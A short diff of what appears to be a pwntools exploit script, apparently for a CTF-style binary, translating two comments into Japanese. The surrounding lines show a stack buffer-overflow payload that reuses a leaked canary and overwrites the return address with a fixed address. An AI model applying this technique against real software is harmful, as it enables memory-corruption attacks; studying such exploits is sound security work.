@@ -168,8 +168,8 @@ canary = int(p.recvline(), 16)
 log.success(f'Canary: {hex(canary)}')
 
 payload = b'A' * 64
-payload += p32(canary)  # overwrite canary with original value to not trigger
-payload += b'A' * 12    # pad to return pointer
+payload += p32(canary)  # カナリアを元の値で上書きして、検出されないようにする
+payload += b'A' * 12    # リターンポインタまでパディングする
 payload += p32(0x08049245)
 
 p.clean()
